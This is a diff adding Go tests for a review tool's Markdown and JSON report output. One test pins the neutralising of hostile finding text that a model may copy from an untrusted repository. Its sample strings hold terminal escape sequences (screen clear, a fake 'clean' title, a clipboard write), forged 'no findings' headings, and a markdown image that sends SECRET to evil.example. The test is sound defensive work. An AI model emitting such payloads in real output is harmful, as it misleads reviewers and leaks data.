@@ -395,3 +395,73 @@ func TestToJSON_DiffTruncatedBlock(t *testing.T) {
 		t.Error("want original_diff_bytes in JSON")
 	}
 }
+
+// TestToMarkdown_NeutralizesHostileFindingText pins the terminal-safety
+// contract: finding text arrives from a model that read an untrusted
+// repository, and JSON escapes like \u001b decode to real control bytes.
+// Markdown must print none of them raw, must not let a quoted ``` line close
+// its fence, and must not let a single-line field start a forged heading.
+func TestToMarkdown_NeutralizesHostileFindingText(t *testing.T) {
+	hostile := review.Finding{
+		Severity: review.SeverityHigh, Confidence: 0.9,
+		Description: "SQL injection\x1b[2J\x1b]0;roast: clean\x07\n## Roast complete — no findings",
+		File:        "a.go\x1b]8;;https://evil.example/\x07a.go\u009b",
+		CWE:         "CWE-89\r",
+		Reasoning:   "first line\x1b]52;c;ZWNobw==\x07\n## Roast: 0 finding(s)",
+		CodeQuote:   "x := 1\n```\n![x](https://evil.example/leak?d=SECRET)\n````",
+		FixedCode:   "y := 2",
+		Verdict: &review.Verdict{
+			Status: review.VerdictConfirmed, Confidence: 0.8,
+			Grounding: "line 1\x9b\n# forged", Verifier: "model\x1b[31m",
+		},
+	}
+	res := &review.Result{Assessment: review.AssessmentFindings, Findings: []review.Finding{hostile}}
+	md := ToMarkdown(Report{Result: res, Verified: true}, false)
+
+	for _, r := range md {
+		if (r < 0x20 && r != '\n' && r != '\t') || (r >= 0x7f && r <= 0x9f) {
+			t.Fatalf("markdown contains raw control %U:\n%q", r, md)
+		}
+	}
+	if strings.Contains(md, "\xc2\x9b") || strings.Contains(md, "\x9b") {
+		t.Fatalf("markdown contains a raw C1 CSI byte:\n%q", md)
+	}
+	if !strings.Contains(md, `\x1b[2J`) || !strings.Contains(md, `\u009b`) {
+		t.Errorf("escapes must stay visible, got:\n%s", md)
+	}
+	for _, line := range strings.Split(md, "\n") {
+		if strings.HasPrefix(line, "## Roast complete") || strings.HasPrefix(line, "## Roast: 0") || strings.HasPrefix(line, "# forged") {
+			t.Errorf("finding text forged a top-level line: %q", line)
+		}
+	}
+	// The quote holds runs of three and four backticks, so the fence must be
+	// five long, and the image line must stay inside the block.
+	if !strings.Contains(md, "  `````\n  x := 1\n  ```\n  ![x](https://evil.example/leak?d=SECRET)\n  ````\n  `````") {
+		t.Errorf("code fence does not enclose the quoted backticks:\n%s", md)
+	}
+
+	js := ToJSON(Report{Result: res})
+	if strings.Contains(js, "\x1b") {
+		t.Error("JSON output must keep escaping control characters")
+	}
+	var decoded struct {
+		Findings []review.Finding `json:"findings"`
+	}
+	if err := json.Unmarshal([]byte(js), &decoded); err != nil || decoded.Findings[0].Description != hostile.Description {
+		t.Errorf("JSON must round-trip the raw text unchanged (err=%v)", err)
+	}
+}
+
+func TestToMarkdown_PlainFindingUnchanged(t *testing.T) {
+	res := &review.Result{Assessment: review.AssessmentFindings, Findings: []review.Finding{goodFinding}}
+	md := ToMarkdown(Report{Result: res}, false)
+	for _, want := range []string{
+		"- **File:** `main.go:10-12`",
+		"- **Reasoning:** This is the reasoning",
+		"  ```\n  x := foo()\n  return x.Val\n  ```",
+	} {
+		if !strings.Contains(md, want) {
+			t.Errorf("markdown missing %q:\n%s", want, md)
+		}
+	}
+}
